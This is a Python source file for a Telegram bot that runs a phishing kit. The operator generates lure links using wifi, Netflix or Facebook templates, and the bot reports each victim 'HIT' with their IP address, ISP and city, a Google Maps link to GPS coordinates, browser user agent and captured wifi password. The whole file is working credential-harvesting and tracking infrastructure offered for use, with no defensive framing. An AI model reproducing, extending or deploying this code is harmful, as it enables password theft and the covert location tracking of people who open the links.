import asyncio
import uuid
import os
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
from aiogram.filters import Command
from database import Scan, get_db

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

async def get_ip_info(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{ip}") as resp:
                data = await resp.json()
                if data['status'] == 'success':
                    return f"{data.get('isp', 'N/A')} | {data.get('city', 'N/A')}, {data.get('country', 'N/A')}"
    except:
        pass
    return "N/A"

@dp.message(Command("start"))
async def start(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("🎣 Use: `/scan [wifi|netflix|facebook] target.com`")

@dp.message(Command("scan"))
async def scan(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.answer("❌ Unauthorized!")
    
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        return await message.answer("❌ `/scan [template] target.com`")
    
    template, target = parts[1].lower(), parts[2]
    if template not in ['wifi', 'netflix', 'facebook']:
        return await message.answer("❌ Template: wifi|netflix|facebook")
    
    unique_id = str(uuid.uuid4())
    db = next(get_db())
    scan = Scan(unique_id=unique_id, template=template, target=target)
    db.add(scan)
    db.commit()
    db.close()
    
    domain = message.chat.username or "your-app"
    link = f"https://{domain}.up.railway.app/report/{unique_id}"
    
    await message.answer(f"✅ **{template.title()}** | `{target}`\n🔗 {link}")

async def send_notification(scan):
    ip_info = await get_ip_info(scan.ip_address)
    loc = f"https://maps.google.com/?q={scan.geolocation}" if scan.geolocation else "N/A"
    
    msg = f"""🎣 **{scan.template.upper()} HIT!**

🌐 IP: `{scan.ip_address}`
🏢 ISP: `{ip_info}`
📍 GPS: {loc}
📱 UA: `{scan.user_agent[:50]}...`
🔑 PASS: `{scan.wifi_password or 'N/A'}`
🆔 ID: `{scan.unique_id}`
🎯 Target: `{scan.target}`"""
    
    await bot.send_message(ADMIN_ID, msg)
